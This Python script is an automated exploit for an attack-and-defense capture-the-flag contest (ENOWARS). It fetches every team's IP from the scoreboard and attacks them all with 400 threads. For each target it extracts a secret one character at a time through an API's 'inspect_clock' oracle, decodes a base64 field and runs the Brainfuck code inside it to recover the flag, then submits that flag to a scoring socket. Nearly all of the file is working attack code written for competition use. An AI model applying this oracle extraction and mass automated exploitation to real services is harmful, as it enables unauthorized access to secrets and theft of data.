#!/usr/bin/env python3
from pwn import *
import json
import requests
import base64


# BACKUP SCRIPT > CREDITS TO : https://jp.security.ntt/tech_blog/enowars-8-writeup-attack-and-defense

# There are a few things to configure : 
# 1. Change json field below to your service in attack.json <refer link below>
# 2. Change this port to your service 
# 3. Write your exploit inside the connect_and_steal_flag func 

SERVICE_NAME = "syncryn1z3"
SERVICE_PORT = 1588

# ========================= [TEMPLATES BEGIN HERE] ===========================

def is_likely_flag(flag):
    import re
    return re.match(r'ENO[A-Za-z0-9+\/=]{48}', flag)

def list_target():
    x = requests.get('https://9.enowars.com/scoreboard/attack.json')
    data = json.loads(x.text)
    flag_dict = dict()
    services = []
    
    # <CHANGE THIS TO YOUR SERVICE'S NAME IN THE ATTACK.JSON>
    for ip, d in data['services'][SERVICE_NAME].items():
        for round_num, targets in d.items():
            for flag_num, flags in targets.items():
                if flag_num == '1':
                    continue # skip .private for now
                assert len(flags) == 1
                flag = flags[0]
                services.append((ip, flag))
    return services

def work(i, ip, path, flags):
    directory, file = path.split('/')
    try:
        flag = connect_and_steal_flag(ip, directory, file)
        print("[+] Submitting flag")
        if flag and is_likely_flag(flag.decode()):
            print("[cooked]")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('10.0.13.37', 1337))
            print(sock.recv(1000))
            sock.send(flag + b'\n')
            print(sock.recv(1000))
            sock.close()
    except EOFError:
        print("COOKED")
        return
    flags[i] = flag

    # CONNECT AND SUBMIT FLAG

# RUNS THE EXPLOIT AGAINST ALL THE AVAILABLE SYSTEMS 
def main():
    from multiprocessing.pool import ThreadPool as Pool
    pool = Pool(400)
    targets = list_target()
    print(f'[+] Running against {len(targets)} targets')
    flags = ['' for _ in targets]

    for i, target_info in enumerate(targets):
        ip, path = target_info
        pool.apply_async(work, (i, ip, path, flags))

    pool.close()
    pool.join()
    
# ============================= [START EXPLOIT] ============================

# Step 3: Function to run Brainfuck code and get the output
def run_brainfuck(code):
    tape = [0] * 30000  # Brainfuck memory tape
    pointer = 0  # Pointer to the current memory cell
    output = []
    code_len = len(code)
    code_ptr = 0

    while code_ptr < code_len:
        command = code[code_ptr]

        if command == '>':
            pointer += 1
        elif command == '<':
            pointer -= 1
        elif command == '+':
            tape[pointer] = (tape[pointer] + 1) % 256  # Wrap around on 256
        elif command == '-':
            tape[pointer] = (tape[pointer] - 1) % 256  # Wrap around on 256
        elif command == '.':
            output.append(chr(tape[pointer]))  # Output the character
        elif command == ',':
            pass  # No input handling
        elif command == '[':
            if tape[pointer] == 0:
                # Jump forward to the command after the matching ']'
                open_brackets = 1
                while open_brackets != 0:
                    code_ptr += 1
                    if code[code_ptr] == '[':
                        open_brackets += 1
                    elif code[code_ptr] == ']':
                        open_brackets -= 1
        elif command == ']':
            if tape[pointer] != 0:
                close_brackets = 1
                while close_brackets != 0:
                    code_ptr -= 1
                    if code[code_ptr] == ']':
                        close_brackets += 1
                    elif code[code_ptr] == '[':
                        close_brackets -= 1

        code_ptr += 1

    return ''.join(output)
    
def connect_and_steal_flag(ip, directory, file):        
    ans = ""

    url = f"http://{ip}:1588/api"
    clockid = directory
    port = file
    
    # print("[+] SHIT ",directory,url,clockid,port)

    if (ip == "10.1.180.1"):
        return
        
    headers = {
        "User-Agent": "python-requests/2.31.0",
        "Accept-Encoding": "gzip, deflate, zstd",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Type": "application/json"
    }


    while len(ans) < 16:
        data = {
            "task": "inspect_clock",
            "clockId": clockid,
            "port": port,
            "secret": ans
        }

        response = requests.post(url, json=data, headers=headers)

        # if response.status_code == 200:
        #     print("Request successful!")
        #     print("Response:", response.json())
        # else:
        #     print(f"Request failed with status code: {response.status_code}")
        #     print("Response:", response.text)
        ans += chr((response.json().get('code', '')))
        # print(ans)


    data = {
        "task": "inspect_clock",
        "clockId": clockid,
        "port": port,
        "secret": ans
    }

    response = requests.post(url, json=data, headers=headers)

    # if response.status_code == 200:
    #     print("Request successful!")
    #     print("Response:", response.json())
    # else:
    #     print(f"Request failed with status code: {response.status_code}")
    #     print("Response:", response.text)
    ans = response.json().get('userDescription', '')
    # print(ans)


    # The base64 string provided
    base64_string = ans

    # Step 1: Base64 Decode the string
    decoded_bytes = base64.b64decode(base64_string)

    decoded_string = decoded_bytes.decode('utf-8')
    # print(decoded_string)
    # Step 2: Extract Brainfuck code between the '@' symbols
    start_index = decoded_string.find('@') + 1
    end_index = decoded_string.find('@', start_index)
    brainfuck_code = decoded_string[start_index:end_index]

    flag = run_brainfuck(brainfuck_code)

    print(f"Flag: {flag}")
    # YOUR EXPLOIT SHOULD RETURN THE FLAG SOMEWHERE WITHIN THE RESULT 
    # REPLACE THE BELOW WITH YOUR FLAG 
    return flag

# ============================ [END EXPLOIT] ===============================

# RUN THE SCRIPT FOREVER 
if __name__ == '__main__':
        main()